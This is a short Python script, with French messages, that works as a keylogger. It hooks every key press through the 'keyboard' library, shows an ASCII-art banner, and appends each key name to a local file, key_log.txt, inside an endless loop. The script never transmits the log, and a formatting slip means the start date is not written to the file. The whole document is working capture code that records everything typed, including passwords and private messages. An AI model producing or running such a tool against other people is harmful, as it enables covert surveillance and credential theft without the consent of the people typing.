import keyboard
import pyfiglet
from datetime import datetime


UseSCript = "5CR1P73"
datenow = datetime.now()
formatedate = datenow.strftime("%D-%Hh:%Mmn")

print(pyfiglet.figlet_format(UseSCript))
print("date de debut", formatedate)
print("En ecoute des touches du clavier...")


with open('key_log.txt',"a") as f :
      
       f.write(pyfiglet.figlet_format(UseSCript))
       
       f.write("Date de debut :".format(formatedate))
       f.write("\n_____________________________\n")

def ecoute_frappe(e):
    
	with open("key_log.txt","a") as f:
            
            nom_touche = e.name
            
            if nom_touche == "space":
                    f.write(f" ")
            elif nom_touche == "enter"  or nom_touche == "ctrl" or nom_touche == "backspace" or nom_touche == "alttabwindows" or nom_touche == "control" or nom_touche == "windows":
                    f.write(f"\n{e.name}")
            else :
                   f.write(f"{e.name}")
            
keyboard.on_press(ecoute_frappe)

while True:
	pass
